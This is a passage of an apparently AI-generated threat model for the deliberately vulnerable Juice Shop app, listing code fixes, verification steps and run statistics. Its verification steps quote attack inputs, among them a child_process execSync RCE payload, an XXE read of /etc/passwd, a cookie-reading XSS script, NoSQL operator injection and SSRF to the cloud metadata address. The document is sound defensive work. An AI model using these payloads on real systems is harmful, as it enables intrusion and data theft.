**Priority:** **P1 — Immediate**
**Severity:** 🔴 Critical
**Effort:** Medium

**Why:** The RSA private key is committed to a public GitHub repository. Anyone who has cloned the repo or pulled the Docker image can sign arbitrary JWTs for any user identity offline. The key must be considered permanently compromised and must be rotated.

**How:**
1. Remove the hardcoded `privateKey` string from [lib/insecurity.ts:28](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:28)
2. Load from environment: `process.env.JWT_PRIVATE_KEY` or `fs.readFileSync(process.env.JWT_PRIVATE_KEY_FILE)`
3. In Docker Compose, mount as a Docker secret: `/run/secrets/jwt_private_key`
4. Generate a new RSA key pair — the existing key is publicly known
5. Add gitleaks/trufflehog to CI to prevent future secret commits

```javascript
// BEFORE (lib/insecurity.ts:28):
const privateKey = '-----BEGIN RSA PRIVATE KEY-----\r\nMIICXA...'

// AFTER:
const privateKey = process.env.JWT_PRIVATE_KEY ||
  fs.readFileSync(process.env.JWT_PRIVATE_KEY_FILE || '/run/secrets/jwt_private_key', 'utf8')
if (!privateKey) throw new Error('JWT_PRIVATE_KEY environment variable is required')
```

**Verification:** Confirm `git log -S 'BEGIN RSA PRIVATE KEY'` shows no new commits with the key string. Verify JWT signing works with environment-loaded key in tests.

**Reference:** CWE-321, https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html

---

#### M-005 — Replace MD5 password hashing with bcrypt {#m-005}

**Addresses:** [T-006](#t-006), [T-027](#t-027)
**Priority:** **P1 — Immediate**
**Severity:** 🔴 Critical
**Effort:** Medium

**Why:** MD5 without salt is trivially reversible. When the database is dumped via SQL injection, every user's actual password is recoverable in seconds. This compounds every data breach to include credential theft.

**How:**
1. Install bcrypt: `npm install bcrypt @types/bcrypt`
2. Replace `crypto.createHash('md5')` at [lib/insecurity.ts:43](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:43) with bcrypt.hashSync with cost factor 12
3. Update login comparison to use `bcrypt.compareSync(plaintext, stored_hash)`
4. Write a lazy migration hook: on first successful MD5 login, re-hash with bcrypt
5. Update [models/user.ts:77](vscode://file/home/mrohr/juice-shop/models/user.ts:77) beforeUpdate hook

```javascript
// BEFORE (lib/insecurity.ts:43):
export const hash = (data: string) => crypto.createHash('md5').update(data).digest('hex')

// AFTER:
import bcrypt from 'bcrypt'
const BCRYPT_ROUNDS = 12
export const hash = (data: string) => bcrypt.hashSync(data, BCRYPT_ROUNDS)
export const verifyHash = (data: string, hash: string) => bcrypt.compareSync(data, hash)
```

**Verification:** Register a new user; confirm password in Users table starts with `$2b$`. Time a login — bcrypt comparison should take ~100ms. Confirm old MD5 passwords cannot be used after migration.

**Reference:** CWE-916, https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html

---

#### M-006 — Remove hardcoded test credentials and HMAC key from source code {#m-006}

**Addresses:** [T-007](#t-007)
**Priority:** **P1 — Immediate**
**Severity:** 🟠 High
**Effort:** Low

**Why:** Test credentials and HMAC keys committed to a public repository can be used immediately to authenticate as support accounts and forge HMAC signatures in production deployments.

**How:**
1. Remove hardcoded credentials from [routes/login.ts:69-75](vscode://file/home/mrohr/juice-shop/routes/login.ts:69)
2. Remove hardcoded HMAC key from [lib/insecurity.ts:44](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:44) — load from environment
3. Move test user seeding to environment-specific fixtures loaded only when `NODE_ENV !== 'production'`
4. Run gitleaks on git history: `docker run --rm -v $(pwd):/path zricethezav/gitleaks:latest detect --source=/path`

```javascript
// AFTER: load credentials from environment in dev/test only
const hmacKey = process.env.HMAC_KEY
if (!hmacKey) throw new Error('HMAC_KEY environment variable required')
export const hmac = (data: string) => crypto.createHmac('sha256', hmacKey).update(data).digest('hex')
```

**Verification:** Confirm gitleaks exits 0 on HEAD. Verify support@juice-sh.op no longer has a hardcoded password. Confirm production Docker image env does not contain test credentials.

**Reference:** CWE-798

---

#### M-008 — Enforce resource ownership checks and disable mass-assignment on auto-API {#m-008}

**Addresses:** [T-009](#t-009), [T-028](#t-028)
**Priority:** **P1 — Immediate**
**Severity:** 🟠 High
**Effort:** Medium

**Why:** Mass assignment via the Sequelize auto-API allows any authenticated user to elevate their own role to admin with a single PUT request. IDOR on basket and data export endpoints allows data theft across user boundaries.

**How:**
1. In [routes/basket.ts](vscode://file/home/mrohr/juice-shop/routes/basket.ts), compare req.params.id against req.user.bid before returning data
2. In [routes/dataExport.ts:26](vscode://file/home/mrohr/juice-shop/routes/dataExport.ts:26), replace req.body.UserId with `(req as any).user.data.id`
3. Add field filtering middleware to `/api/Users` PUT endpoint stripping role, isActive, and other privileged fields
4. Consider disabling or routing the Sequelize auto-API through explicit controllers

```javascript
// BEFORE (routes/dataExport.ts:26):
memories = await MemoryModel.findAll({ where: { UserId: req.body.UserId } })

// AFTER:
const userId = (req as any).user.data.id  // from validated JWT payload
memories = await MemoryModel.findAll({ where: { UserId: userId } })
```

**Verification:** PUT /api/Users/:ownId with `{role:'admin'}` in body — role field must be stripped. GET /api/Baskets/1 with a token for userId=2 — must return 403.

**Reference:** CWE-639, CWE-915, OWASP API Security Top 10 API1:2023

---

#### M-009 — Remove eval() and sandbox escape — validate B2B order structure statically {#m-009}

**Addresses:** [T-010](#t-010), [T-015](#t-015)
**Priority:** **P1 — Immediate**
**Severity:** 🔴 Critical
**Effort:** High

**Why:** Two separate eval()-based code execution paths exist: B2B order processing uses notevil/vm (known RCE escapes) and profile username uses direct eval(). Either enables arbitrary Node.js execution as the application process.

**How:**
1. Replace vm.runInContext + notevil in [routes/b2bOrder.ts:23](vscode://file/home/mrohr/juice-shop/routes/b2bOrder.ts:23) with Ajv JSON schema validation
2. Remove the `eval(code)` call from [routes/userProfile.ts:62](vscode://file/home/mrohr/juice-shop/routes/userProfile.ts:62) — process username as a plain string
3. In [routes/userProfile.ts:88](vscode://file/home/mrohr/juice-shop/routes/userProfile.ts:88), validate profile image URL against allowlist before inserting into CSP header
4. If dynamic order computation is required, use worker_threads with message-passing

```javascript
// BEFORE (routes/b2bOrder.ts:23):
vm.runInContext('safeEval(orderLinesData)', sandbox, { timeout: 2000 })

// AFTER: validate with JSON schema (Ajv):
import Ajv from 'ajv'
const ajv = new Ajv()
const orderSchema = {
  type: 'array',
  items: {
    type: 'object',
    required: ['productId', 'quantity'],
    properties: {
      productId: { type: 'integer', minimum: 1 },
      quantity: { type: 'integer', minimum: 1, maximum: 100 }
    },
    additionalProperties: false
  }
}
const orderLines = JSON.parse(orderLinesData)
if (!ajv.validate(orderSchema, orderLines)) {
  throw new Error('Invalid order structure: ' + ajv.errorsText())
}
```

**Verification:** Send B2B order with payload `process.mainModule.require('child_process').execSync('id')` — must return 400 validation error. Set username to `require('os').hostname()` — must be stored as literal string, not evaluated.

**Reference:** CWE-94, https://cheatsheetseries.owasp.org/cheatsheets/NodeJS_Security_Cheat_Sheet.html

---

#### M-011 — Disable external entity resolution in libxmljs2 {#m-011}

**Addresses:** [T-012](#t-012)
**Priority:** **P1 — Immediate**
**Severity:** 🟠 High
**Effort:** Low

**Why:** `noent:true` in libxmljs2 enables XXE attacks that can read arbitrary server-side files including /etc/passwd and internal service URLs. A one-character fix eliminates this entirely.

**How:**
1. In [routes/fileUpload.ts:83](vscode://file/home/mrohr/juice-shop/routes/fileUpload.ts:83), change `noent: true` to `noent: false`
2. Add `nonet: true` to prevent network-based XXE (SSRF via XML)
3. Add a test with XXE payload targeting /etc/passwd

```javascript
// BEFORE (routes/fileUpload.ts:83):
libxml.parseXml(data, { noblanks: true, noent: true, nocdata: true })

// AFTER:
libxml.parseXml(data, { noblanks: true, noent: false, nonet: true, nocdata: true })
```

**Verification:** Upload XML containing `<!ENTITY xxe SYSTEM "file:///etc/passwd">&xxe;` — response must not contain /etc/passwd contents.

**Reference:** CWE-611, https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html

---

#### M-014 — Add URL validation and SSRF protection for profile image upload {#m-014}

**Addresses:** [T-016](#t-016)
**Priority:** **P1 — Immediate**
**Severity:** 🟠 High
**Effort:** Medium

**Why:** The profile image URL upload fetches any attacker-supplied URL without validation, enabling SSRF attacks against internal services and cloud metadata endpoints (AWS/GCP/Azure metadata at 169.254.169.254).

**How:**
1. Parse URL with `new URL(url)` and reject non-http(s) schemes
2. Block private IP ranges: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8, 169.254.0.0/16
3. Resolve hostname to IP with `dns.promises.lookup` and re-validate the resolved IP (prevents DNS rebinding)
4. Set a 5-second timeout and 5MB response size limit

```javascript
// BEFORE (routes/profileImageUrlUpload.ts:24):
const response = await fetch(url)

// AFTER:
const parsed = new URL(url)  // throws on malformed URL
if (!['http:', 'https:'].includes(parsed.protocol)) {
  return res.status(400).json({ error: 'Only http and https URLs are allowed' })
}
const resolved = await dns.promises.lookup(parsed.hostname)
if (isPrivateIP(resolved.address)) {
  return res.status(400).json({ error: 'URL resolves to a private address' })
}
const response = await fetch(url, { signal: AbortSignal.timeout(5000) })
```

**Verification:** POST http://169.254.169.254/latest/meta-data/ as profile image URL — must return 400. POST http://127.0.0.1:3000 — must return 400. Valid external image URL — must work.

**Reference:** CWE-918, https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html

---

#### M-017 — Remove DomSanitizer.bypassSecurityTrustHtml() calls {#m-017}

**Addresses:** [T-019](#t-019), [T-023](#t-023)
**Priority:** **P1 — Immediate**
**Severity:** 🔴 Critical
**Effort:** Low

**Why:** Three Angular components explicitly disable XSS protection by calling bypassSecurityTrustHtml(). This directly causes stored XSS — the vulnerability is not a bypass of Angular's protection; it is the intentional removal of it. The fix requires changing `[innerHTML]="sanitizer.bypassSecurityTrustHtml(x)"` to `{{x}}` in all three locations.

**How:**
1. In [about.component.ts:119](vscode://file/home/mrohr/juice-shop/frontend/src/app/about/about.component.ts:119) replace innerHTML binding with text interpolation `{{feedback.comment}}`
2. In [administration.component.ts:60](vscode://file/home/mrohr/juice-shop/frontend/src/app/administration/administration.component.ts:60) fix email rendering
3. In [administration.component.ts:78](vscode://file/home/mrohr/juice-shop/frontend/src/app/administration/administration.component.ts:78) fix feedback comment rendering
4. Search for remaining bypasses: `grep -r 'bypassSecurityTrustHtml' frontend/src/`

```typescript
// BEFORE (about.component.ts:119):
<div [innerHTML]="sanitizer.bypassSecurityTrustHtml(feedback.comment)"></div>

// AFTER (plain text — no XSS possible):
<div>{{feedback.comment}}</div>

// If HTML formatting is genuinely required:
import DOMPurify from 'dompurify'
<div [innerHTML]="sanitizer.bypassSecurityTrustHtml(DOMPurify.sanitize(feedback.comment))"></div>
```

**Verification:** Post feedback containing `<script>alert(document.cookie)</script>` — script tag renders as literal text in the about page and admin panel. No alert dialog appears.

**Reference:** CWE-79, https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html

---

#### M-021 — Add server-side admin role enforcement on all admin API endpoints {#m-021}

**Addresses:** [T-024](#t-024)
**Priority:** **P1 — Immediate**
**Severity:** 🟠 High
**Effort:** Medium

**Why:** Admin authorization is enforced only in the Angular route guard — a client-side JavaScript check. Any authenticated user can call admin REST endpoints directly. A single middleware addition closes this gap for all current and future admin routes.

**How:**
1. Add an `isAdmin()` middleware to [lib/insecurity.ts](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts) that checks `req.user.data.role === 'admin'`
2. Apply to all admin-only routes in [server.ts](vscode://file/home/mrohr/juice-shop/server.ts): accounting export, application version, user management
3. Add integration test: non-admin JWT on admin endpoint returns 403

```javascript
// New middleware (lib/insecurity.ts):
export const isAdmin = () => (req: Request, res: Response, next: NextFunction) => {
  const user = (req as any).user?.data
  if (!user || user.role !== 'admin') {
    return res.status(403).json({ error: 'Forbidden — admin access required' })
  }
  next()
}

// Apply in server.ts:
app.get('/rest/admin/application-version',
  security.isAuthorized(),
  security.isAdmin(),
  appVersion.serveVersion()
)
```

**Verification:** Call `GET /rest/admin/application-version` with a standard user JWT — must return 403. With admin JWT — must return version string.

**Reference:** CWE-602, https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html

---

### P2 — This Sprint

---

#### M-007 — Fix open redirect — use strict prefix matching {#m-007}

**Addresses:** [T-008](#t-008)
**Priority:** **P2 — This Sprint**
**Severity:** 🟡 Medium
**Effort:** Low

**Why:** The URL allowlist check uses `includes()` substring matching, allowing redirects to attacker-controlled domains that contain the trusted hostname as a substring (e.g., juice-sh.op.evil.com).

**How:**
1. In [lib/insecurity.ts:137](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:137), replace `url.includes(allowedUrl)` with hostname comparison using `new URL(url).hostname`

```javascript
// BEFORE:
allowed = allowed || url.includes(allowedUrl)

// AFTER:
try {
  const parsed = new URL(url)
  allowed = allowed || allowedUrls.some(a => {
    const allowedParsed = new URL(a)
    return parsed.hostname === allowedParsed.hostname &&
           parsed.protocol === allowedParsed.protocol
  })
} catch { allowed = false }
```

**Verification:** Redirect to `https://juice-sh.op.evil.com` must return 400. Redirect to `https://juice-sh.op/` must work.

**Reference:** CWE-601

---

#### M-010 — Bind review author to authenticated session {#m-010}

**Addresses:** [T-011](#t-011)
**Priority:** **P2 — This Sprint**
**Severity:** 🟠 High
**Effort:** Low

**Why:** The review author field is taken from the request body, allowing any user to post reviews attributed to any email address, including admins.

**How:**
1. In [routes/createProductReviews.ts:22](vscode://file/home/mrohr/juice-shop/routes/createProductReviews.ts:22), replace `req.body.author` with `(req as any).user.data.email`

```javascript
// BEFORE:
author: req.body.author

// AFTER:
author: (req as any).user.data.email  // bound to authenticated session
```

**Verification:** POST /api/ProductReviews with `author:admin@juice-sh.op` in the body — the stored review must show the actual authenticated user's email.

**Reference:** CWE-290

---

#### M-012 — Add path traversal check for ZIP extraction {#m-012}

**Addresses:** [T-013](#t-013)
**Priority:** **P2 — This Sprint**
**Severity:** 🟠 High
**Effort:** Low

**Why:** ZIP files can contain entries with `../` path components that escape the target directory. A one-line boundary check prevents arbitrary file overwrites.

**How:**
1. After resolving the path at [routes/fileUpload.ts:42](vscode://file/home/mrohr/juice-shop/routes/fileUpload.ts:42), verify it starts with the target directory

```javascript
// BEFORE:
const filePath = path.resolve('uploads/complaints/' + fileName)

// AFTER:
const targetDir = path.resolve('uploads/complaints')
const filePath = path.resolve(targetDir, fileName)
if (!filePath.startsWith(targetDir + path.sep)) {
  throw new Error('Path traversal attempt detected')
}
```

**Verification:** Upload a ZIP containing an entry named `../../server.ts` — must return 400. Verify no file is written outside uploads/complaints/.

**Reference:** CWE-22

---

#### M-013 — Validate NoSQL query parameters with strict type checking {#m-013}

**Addresses:** [T-014](#t-014)
**Priority:** **P2 — This Sprint**
**Severity:** 🟠 High
**Effort:** Low

**Why:** Object-type input passed to MarsDB queries enables NoSQL injection via MongoDB operator objects like `{$gt:''}`.

**How:**
1. In [routes/updateProductReviews.ts:18](vscode://file/home/mrohr/juice-shop/routes/updateProductReviews.ts:18), validate `typeof req.body.id === 'string'` and reject objects

```javascript
// BEFORE:
db.reviewsCollection.update({ _id: req.body.id }, ...)

// AFTER:
if (typeof req.body.id !== 'string' || req.body.id.includes('$')) {
  return res.status(400).json({ error: 'Invalid review ID' })
}
db.reviewsCollection.update({ _id: req.body.id }, ...)
```

**Verification:** Send PUT /api/ProductReviews with `id: {"$gt": ""}` — must return 400.

**Reference:** CWE-943

---

#### M-015 — Use safe YAML loading and enforce file size limits {#m-015}

**Addresses:** [T-017](#t-017), [T-025](#t-025)
**Priority:** **P2 — This Sprint**
**Severity:** 🟡 Medium
**Effort:** Low

**Why:** `yaml.load()` without schema restrictions enables YAML bomb DoS via alias expansion. A schema flag eliminates this.

**How:**
1. In [routes/fileUpload.ts:117](vscode://file/home/mrohr/juice-shop/routes/fileUpload.ts:117), use `yaml.load(data, { schema: yaml.FAILSAFE_SCHEMA })`
2. Enforce a 1MB pre-parse file size limit

```javascript
// BEFORE:
yaml.load(data)

// AFTER (js-yaml v4):
yaml.load(data, { schema: yaml.FAILSAFE_SCHEMA })
```

**Verification:** Upload a YAML bomb (recursive aliases) — Node.js process should not crash or exhaust memory.

**Reference:** CWE-776, CWE-400

---

#### M-016 — Add rate limiting on authentication endpoints {#m-016}

**Addresses:** [T-018](#t-018)
**Priority:** **P2 — This Sprint**
**Severity:** 🟡 Medium
**Effort:** Low

**Why:** Without rate limiting, attackers can perform unlimited brute-force or credential stuffing against user accounts.

**How:**
1. Install express-rate-limit: `npm install express-rate-limit`
2. Apply 5 requests per 15 minutes to POST /rest/user/login
3. Apply 3 requests per hour to POST /rest/user/register

```javascript
import rateLimit from 'express-rate-limit'
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'Too many login attempts — try again in 15 minutes' }
})
app.post('/rest/user/login', loginLimiter, ...)
```

**Verification:** Send 6 rapid login requests — the 6th must return 429 with a Retry-After header.

**Reference:** CWE-307, https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html

---

#### M-018 — Migrate JWT storage from localStorage to httpOnly cookie {#m-018}

**Addresses:** [T-020](#t-020)
**Priority:** **P2 — This Sprint**
**Severity:** 🟠 High
**Effort:** High

**Why:** JWT stored in localStorage is accessible to any JavaScript on the page, making every XSS vulnerability (T-019, T-023) also a session hijacking vulnerability.

**How:**
1. Change login endpoint to set JWT as `httpOnly Secure SameSite=Strict` cookie
2. Update [request.interceptor.ts](vscode://file/home/mrohr/juice-shop/frontend/src/app/Services/request.interceptor.ts) to stop reading from localStorage
3. Add server-side logout clearing the cookie
4. Remove all `localStorage.setItem('token', ...)` calls

```javascript
// BEFORE (login route response):
res.json({ authentication: { token: token, ... } })

// AFTER:
res.cookie('token', token, {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'strict',
  maxAge: 8 * 60 * 60 * 1000
}).json({ authentication: { ... } })
```

**Verification:** After login, confirm `document.cookie` does not include the JWT value. Confirm XSS payload reading `localStorage.getItem('token')` returns null.

**Reference:** CWE-922, https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html

---

#### M-019 — Restrict CORS to specific allowed origins {#m-019}

**Addresses:** [T-021](#t-021)
**Priority:** **P2 — This Sprint**
**Severity:** 🟠 High
**Effort:** Low

**Why:** The CORS wildcard allows any website to make credentialed API calls on behalf of authenticated users, enabling cross-origin attacks equivalent to CSRF.

**How:**
1. In [server.ts:181-182](vscode://file/home/mrohr/juice-shop/server.ts:181), replace `cors()` with `cors({ origin: allowedOrigins, credentials: true })`
2. Load allowed origins from environment variable `CORS_ALLOWED_ORIGINS`

```javascript
// BEFORE:
app.options('*', cors())
app.use(cors())

// AFTER:
const corsOptions = {
  origin: (process.env.CORS_ALLOWED_ORIGINS || 'http://localhost:4200').split(','),
  credentials: true,
  optionsSuccessStatus: 204
}
app.use(cors(corsOptions))
```

**Verification:** CORS preflight from http://evil.com must not return Access-Control-Allow-Origin. From http://localhost:4200 — must work.

**Reference:** CWE-942

---

#### M-020 — Strengthen Content Security Policy and fix header injection {#m-020}

**Addresses:** [T-022](#t-022)
**Priority:** **P2 — This Sprint**
**Severity:** 🟡 Medium
**Effort:** Medium

**Why:** The current CSP is nearly absent (only noSniff + frameguard). The dynamic CSP in userProfile.ts injects user-controlled values, enabling CSP header injection and bypass.

**How:**
1. Enable Helmet's full CSP with `contentSecurityPolicy` directive in [server.ts](vscode://file/home/mrohr/juice-shop/server.ts)
2. Remove `'unsafe-eval'` from script-src
3. In [routes/userProfile.ts:88](vscode://file/home/mrohr/juice-shop/routes/userProfile.ts:88), validate the profile image URL before inserting into the CSP header
4. Re-enable xssFilter

```javascript
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      imgSrc: ["'self'", 'data:', 'https://i.imgur.com'],
      connectSrc: ["'self'"],
      frameSrc: ["'none'"],
    }
  },
  xssFilter: true
}))
```

**Verification:** Check response headers — Content-Security-Policy must not contain `unsafe-eval`. Set username with a semicolon — verify it cannot break out of the CSP header.

**Reference:** CWE-693

---

### P3 — Next Quarter

There are no P3 mitigations — all identified gaps are P1 or P2 given the severity of the findings. The P1 remediations above are prerequisites for any production deployment of an application sharing this architecture.

---

## 11. Out of Scope

The following areas were not analyzed in this assessment:

1. **Individual challenge walkthroughs** — The 100+ intentional challenges embedded in Juice Shop are by design. This threat model focuses on architectural and code-level findings relevant to production applications, not the challenge catalog itself.

2. **Client-side JavaScript deobfuscation** — The compiled Angular bundle contains hidden routes and challenge hints. These were not reverse-engineered beyond what is visible in TypeScript source.

3. **Docker container escape** — Container isolation, kernel namespaces, and Linux capabilities were not assessed. The threat model assumes the Docker container boundary provides some isolation.

4. **Third-party hosted infrastructure** — The GitHub Actions CI/CD environment, npm registry, and Crowdin translation platform were reviewed at the workflow configuration level only. The security of these third-party services is assumed.

5. **Browser-specific exploitation** — Browser vulnerabilities, extension-based attacks, and browser-fingerprinting risks were not assessed.

6. **Social engineering / phishing** — Physical security, employee targeting, and social engineering attack vectors are out of scope.

7. **Network-layer attacks** — DDoS amplification, BGP hijacking, TLS downgrade attacks, and network-level Man-in-the-Middle attacks were not assessed.

8. **Specific CVE exploitation against Node.js runtime** — Node.js 20.x was assumed to be patched to current. Vulnerabilities in the V8 engine or libuv were not assessed.

9. **Translation/i18n content** — Crowdin-managed translation files were not assessed for content injection risks.

---

## Appendix: Run Statistics

| Field | Value |
|-------|-------|
| Generated | 2026-04-13T17:50:00Z |
| Total Duration | 14 min 07 s (assessment: 6 min 36 s + QA review: 7 min 31 s) |
| Mode | full (thorough depth) |
| Plugin Version | appsec-plugin 0.9.0-beta (analysis v1) |
| Assessment Depth | thorough (components: 8, STRIDE turns: 20/28/35) |
| Repository | /home/mrohr/juice-shop |
| Baseline SHA | 7380ce712 (master) |
| Components Analyzed | 8 |
| Threats Identified | 29 (7 Critical, 12 High, 6 Medium, 4 Low) |
| Mitigations Produced | 21 |
| STRIDE Coverage | Spoofing (4), Tampering (7), Repudiation (1), Information Disclosure (9), DoS (3), EoP (5) |
| Tokens | 16,081,750 total (in: 272, out: 51,886, cache write: 323,888, cache read: 15,705,704) |
| Est. Cost | ~$6.71 (estimated — subscription plan) |

### Phase Duration Breakdown

| Phase | Description | Agent | Duration |
|-------|-------------|-------|----------|
| Phase 1 | Context Resolution | context-resolver (claude-sonnet-4-6) | 2m 01s |
| Phase 2 | Reconnaissance + SCA dispatch | recon-scanner (claude-sonnet-4-6), dep-scanner (claude-sonnet-4-6) | 2m 01s |
| Phase 3 | Architecture Modeling (5 diagrams) | threat-analyst (claude-sonnet-4-6) | 4m 49s |
| Phase 4 | Security Use Cases (6 sequence diagrams) | threat-analyst (claude-sonnet-4-6) | 4m 49s |
| Phase 5 | Asset Identification (14 assets) | threat-analyst (claude-sonnet-4-6) | 4m 49s |
| Phase 6 | Attack Surface Mapping (8 entry points) | threat-analyst (claude-sonnet-4-6) | 4m 49s |
| Phase 7 | Trust Boundary Analysis (5 boundaries) | threat-analyst (claude-sonnet-4-6) | 4m 49s |
| Phase 8 | Security Controls Catalog (14 controls) | threat-analyst (claude-sonnet-4-6) | 4m 49s |
| Phase 9 | STRIDE Threat Enumeration (29 threats / 8 components) | 8 x stride-analyzer (claude-sonnet-4-6) | 0m 11s |
| Phase 10 | Scan Synthesis (secrets + SCA) | threat-analyst (claude-sonnet-4-6) | < 1s |
| Phase 11 | Finalization (YAML + MD composition) | threat-analyst (claude-sonnet-4-6) | 16m 09s |
| **Assessment Total** | | | **6m 36s** |
| QA Review | Cross-reference validation, link fixes, Management Summary generation | qa-reviewer (claude-sonnet-4-6) | 7m 31s |
| **Grand Total** | | | **14m 07s** |

> Phases 1–2 ran in parallel. Phases 3–8 ran in parallel. Phase 9 dispatched 8 STRIDE analyzers in parallel. Wall-clock durations overlap; the Assessment Total reflects actual analysis time from `analysis_duration_seconds` in threat-model.yaml.

### Coverage Summary

| Metric | Count |
|--------|-------|
| Components analyzed | 8 (rest-api, auth-service, frontend-spa, admin-panel, b2b-orders, file-upload, data-services, ci-cd-pipeline) |
| Total threats identified | 29 |
| Critical threats | 7 |
| High threats | 12 |
| Medium threats | 6 |
| Low threats | 4 |
| Mitigations generated | 21 |
| Security controls rated | 14 |
| Attack surface entry points | 8 (4 unauthenticated, 4 authenticated) |
| Trust boundaries mapped | 5 |
| Assets catalogued | 14 |
